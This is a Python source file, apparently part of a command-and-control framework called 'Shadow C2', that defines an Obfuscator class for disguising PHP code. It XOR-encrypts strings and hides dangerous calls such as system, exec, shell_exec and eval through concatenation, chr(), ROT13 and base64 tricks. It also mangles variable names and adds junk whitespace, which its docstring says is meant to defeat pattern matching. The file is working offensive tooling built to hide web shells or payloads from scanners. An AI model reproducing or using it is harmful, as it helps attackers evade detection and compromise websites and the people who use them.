#!/usr/bin/env python3
"""
Shadow C2 — Obfuscator
String/token-level obfuscation: string encryption, variable mangling,
function call encoding, variable indirection, whitespace manipulation.
"""

import random
import re
import string


class Obfuscator:
    """Token-level PHP code obfuscation."""

    def encrypt_strings(self, php_code: str, key: str = None) -> str:
        """
        Find string literals, XOR-encrypt them, replace with runtime decryption.
        Injects a _xd() XOR decrypt helper at the top.
        """
        if key is None:
            key = ''.join(random.choices(string.ascii_letters, k=8))

        # Find single-quoted strings (safe to encrypt)
        str_pattern = re.compile(r"'([^']{4,})'")
        encrypted_strings = {}
        counter = [0]

        def encrypt_match(m):
            s = m.group(1)
            # XOR encrypt
            encrypted = ""
            for i, ch in enumerate(s):
                encrypted += f"\\x{ord(ch) ^ ord(key[i % len(key)]):02x}"
            var_name = f"_s{counter[0]}"
            counter[0] += 1
            encrypted_strings[var_name] = encrypted
            return f"_xd(\"{encrypted}\", '{key}')"

        result = str_pattern.sub(encrypt_match, php_code)

        # Inject XOR decrypt function
        xor_func = """
function _xd($d, $k) {
    $r = '';
    $kl = strlen($k);
    for($i = 0; $i < strlen($d); $i++) {
        $r .= chr(ord($d[$i]) ^ ord($k[$i % $kl]));
    }
    return $r;
}"""
        if encrypted_strings:
            result = result.replace("<?php", "<?php\n" + xor_func, 1)

        return result

    def mangle_variables(self, php_code: str) -> str:
        """Replace variable names with short hex-like names."""
        protected = {
            "$_GET", "$_POST", "$_REQUEST", "$_SERVER", "$_SESSION",
            "$_COOKIE", "$_FILES", "$_ENV", "$GLOBALS", "$this",
        }

        var_pattern = re.compile(r'\$([a-zA-Z_]\w{3,})')
        variables = set(var_pattern.findall(php_code))

        var_map = {}
        idx = 0
        for var in sorted(variables):
            if f"${var}" in protected:
                continue
            hex_name = f"_{idx:x}"
            var_map[var] = hex_name
            idx += 1

        for old, new in sorted(var_map.items(), key=lambda x: len(x[0]), reverse=True):
            php_code = php_code.replace(f"${old}", f"${new}")

        return php_code

    def encode_function_calls(self, php_code: str) -> str:
        """
        Replace direct function calls with obfuscated variants.
        Randomly picks one method per function occurrence.
        """
        dangerous_funcs = [
            "system", "exec", "shell_exec", "passthru", "popen",
            "proc_open", "file_get_contents", "file_put_contents",
            "eval", "assert", "base64_decode", "gzuncompress",
        ]

        methods = [
            self._encode_concat,
            self._encode_chr,
            self._encode_rot13,
            self._encode_b64,
            self._encode_variable_func,
        ]

        for func in dangerous_funcs:
            if func in php_code:
                method = random.choice(methods)
                php_code = method(php_code, func)

        return php_code

    def _encode_concat(self, code: str, func: str) -> str:
        """String concatenation: 'system' -> 'sy'.'st'.'em'"""
        mid = len(func) // 2
        parts = [func[:mid], func[mid:]]
        concat = ".".join(f"'{p}'" for p in parts)
        var = f"$_f{random.randint(10,99)}"
        # Replace first occurrence of function call
        pattern = re.compile(rf'\b{func}\s*\(')
        replacement = f"{var} = {concat}; {var}("
        return pattern.sub(replacement, code, count=1)

    def _encode_chr(self, code: str, func: str) -> str:
        """chr() construction: 'system' -> chr(115).chr(121)..."""
        chrs = ".".join(f"chr({ord(c)})" for c in func)
        var = f"$_c{random.randint(10,99)}"
        pattern = re.compile(rf'\b{func}\s*\(')
        return pattern.sub(f"{var} = {chrs}; {var}(", code, count=1)

    def _encode_rot13(self, code: str, func: str) -> str:
        """ROT13: 'system' -> str_rot13('flfgrz')"""
        import codecs
        rot = codecs.encode(func, 'rot_13')
        var = f"$_r{random.randint(10,99)}"
        pattern = re.compile(rf'\b{func}\s*\(')
        return pattern.sub(f"{var} = str_rot13('{rot}'); {var}(", code, count=1)

    def _encode_b64(self, code: str, func: str) -> str:
        """Base64: 'system' -> base64_decode('c3lzdGVt')"""
        import base64
        b = base64.b64encode(func.encode()).decode()
        var = f"$_b{random.randint(10,99)}"
        pattern = re.compile(rf'\b{func}\s*\(')
        return pattern.sub(f"{var} = base64_decode('{b}'); {var}(", code, count=1)

    def _encode_variable_func(self, code: str, func: str) -> str:
        """Variable variable: $$x where $x = 'funcname'"""
        parts = [func[:len(func)//2], func[len(func)//2:]]
        var1 = f"$_a{random.randint(10,99)}"
        var2 = f"$_b{random.randint(10,99)}"
        var3 = f"$_fn{random.randint(10,99)}"
        pattern = re.compile(rf'\b{func}\s*\(')
        setup = f"{var1}='{parts[0]}';{var2}='{parts[1]}';{var3}={var1}.{var2};"
        return pattern.sub(f"{setup}{var3}(", code, count=1)

    def add_variable_indirection(self, php_code: str) -> str:
        """Add variable-variable indirection ($$var)."""
        var_pattern = re.compile(r'\$([a-zA-Z_]\w{5,})')
        variables = list(set(var_pattern.findall(php_code)))

        if not variables:
            return php_code

        # Pick one variable to add indirection
        target = random.choice(variables)
        indirect_name = f"_i{random.randint(100,999)}"
        php_code = php_code.replace(
            f"${target}",
            f"${{{indirect_name}}}",
            1)
        # Add the indirect variable assignment before first use
        php_code = php_code.replace(
            "<?php",
            f"<?php\n${indirect_name} = '{target}';",
            1)

        return php_code

    def encode_integers(self, php_code: str) -> str:
        """Replace integers with hex notation."""
        def to_hex(m):
            n = int(m.group(1))
            if n < 2:
                return m.group(0)
            return f"0x{n:X}"

        return re.sub(r'(?<!["\'\w$])(\d{2,5})(?!["\'\w])', to_hex, php_code)

    def remove_whitespace(self, php_code: str) -> str:
        """Minify PHP code."""
        lines = php_code.split("\n")
        result = []
        for line in lines:
            stripped = line.strip()
            if stripped and not stripped.startswith("//") and not stripped.startswith("/*"):
                result.append(stripped)
        return " ".join(result)

    def add_junk_whitespace(self, php_code: str) -> str:
        """Add random whitespace to break pattern matching."""
        result = []
        for char in php_code:
            result.append(char)
            if char in "({;," and random.random() < 0.2:
                result.append(random.choice([" ", "\t", "  ", " \t"]))
        return "".join(result)

    def apply_all(self, php_code: str, level: int = 5) -> str:
        """Apply obfuscation techniques based on level (1-10)."""
        if level >= 2:
            php_code = self.encode_function_calls(php_code)
        if level >= 4:
            php_code = self.encrypt_strings(php_code)
        if level >= 6:
            php_code = self.mangle_variables(php_code)
        if level >= 7:
            php_code = self.encode_integers(php_code)
        if level >= 8:
            php_code = self.add_junk_whitespace(php_code)
        if level >= 10:
            php_code = self.add_variable_indirection(php_code)
        return php_code
